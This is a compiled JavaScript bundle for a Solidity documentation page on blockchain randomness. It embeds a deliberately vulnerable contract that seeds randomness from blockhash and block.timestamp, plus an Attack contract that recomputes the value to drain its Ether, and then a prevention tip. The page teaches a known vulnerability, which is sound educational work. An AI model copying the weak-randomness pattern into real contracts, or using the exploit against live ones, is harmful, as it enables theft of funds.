"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[9824],{3905:function(e,n,t){t.d(n,{Zo:function(){return u},kt:function(){return d}});var r=t(7294);function o(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function a(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);n&&(r=r.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,r)}return t}function i(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?a(Object(t),!0).forEach((function(n){o(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):a(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function c(e,n){if(null==e)return{};var t,r,o=function(e,n){if(null==e)return{};var t,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||(o[t]=e[t]);return o}(e,n);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)t=a[r],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(o[t]=e[t])}return o}var s=r.createContext({}),l=function(e){var n=r.useContext(s),t=n;return e&&(t="function"==typeof e?e(n):i(i({},n),e)),t},u=function(e){var n=l(e.components);return r.createElement(s.Provider,{value:n},e.children)},m={inlineCode:"code",wrapper:function(e){var n=e.children;return r.createElement(r.Fragment,{},n)}},p=r.forwardRef((function(e,n){var t=e.components,o=e.mdxType,a=e.originalType,s=e.parentName,u=c(e,["components","mdxType","originalType","parentName"]),p=l(t),d=o,b=p["".concat(s,".").concat(d)]||p[d]||m[d]||a;return t?r.createElement(b,i(i({ref:n},u),{},{components:t})):r.createElement(b,i({ref:n},u))}));function d(e,n){var t=arguments,o=n&&n.mdxType;if("string"==typeof e||o){var a=t.length,i=new Array(a);i[0]=p;var c={};for(var s in n)hasOwnProperty.call(n,s)&&(c[s]=n[s]);c.originalType=e,c.mdxType="string"==typeof e?e:o,i[1]=c;for(var l=2;l<a;l++)i[l]=t[l];return r.createElement.apply(null,i)}return r.createElement.apply(null,t)}p.displayName="MDXCreateElement"},4615:function(e,n,t){t.r(n),t.d(n,{contentTitle:function(){return s},default:function(){return p},frontMatter:function(){return c},metadata:function(){return l},toc:function(){return u}});var r=t(7462),o=t(3366),a=(t(7294),t(3905)),i=["components"],c={title:"Source of Randomness",version:"0.8.10",description:"Blockchain is not a reliable source of randomness in Solidity"},s=void 0,l={unversionedId:"example/Randomness",id:"example/Randomness",isDocsHomePage:!1,title:"Source of Randomness",description:"Blockchain is not a reliable source of randomness in Solidity",source:"@site/docs/example/Randomness.md",sourceDirName:"example",slug:"/example/Randomness",permalink:"/rooctblog/docs/example/Randomness",tags:[],version:"current",frontMatter:{title:"Source of Randomness",version:"0.8.10",description:"Blockchain is not a reliable source of randomness in Solidity"},sidebar:"docs",previous:{title:"Primitive Data Types",permalink:"/rooctblog/docs/example/Primitives"},next:{title:"Re-Entrancy",permalink:"/rooctblog/docs/example/ReEntrancy"}},u=[{value:"Vulnerability",id:"vulnerability",children:[]},{value:"Preventative Techniques",id:"preventative-techniques",children:[]}],m={toc:u};function p(e){var n=e.components,t=(0,o.Z)(e,i);return(0,a.kt)("wrapper",(0,r.Z)({},m,t,{components:n,mdxType:"MDXLayout"}),(0,a.kt)("h3",{id:"vulnerability"},"Vulnerability"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"blockhash")," and ",(0,a.kt)("inlineCode",{parentName:"p"},"block.timestamp")," are not reliable sources for randomness."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-solidity"},'// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n\n/*\nNOTE: cannot use blockhash in Remix so use ganache-cli\n\nnpm i -g ganache-cli\nganache-cli\nIn remix switch environment to Web3 provider\n*/\n\n/*\nGuessTheRandomNumber is a game where you win 1 Ether if you can guess the\npseudo random number generated from block hash and timestamp.\n\nAt first glance, it seems impossible to guess the correct number.\nBut let\'s see how easy it is win.\n\n1. Alice deploys GuessTheRandomNumber with 1 Ether\n2. Eve deploys Attack\n3. Eve calls Attack.attack() and wins 1 Ether\n\nWhat happened?\nAttack computed the correct answer by simply copying the code that computes the random number.\n*/\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}("");\n            require(sent, "Failed to send Ether");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n\n')),(0,a.kt)("h3",{id:"preventative-techniques"},"Preventative Techniques"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Don't use ",(0,a.kt)("inlineCode",{parentName:"li"},"blockhash")," and ",(0,a.kt)("inlineCode",{parentName:"li"},"block.timestamp")," as source of randomness")))}p.isMDXComponent=!0}}]);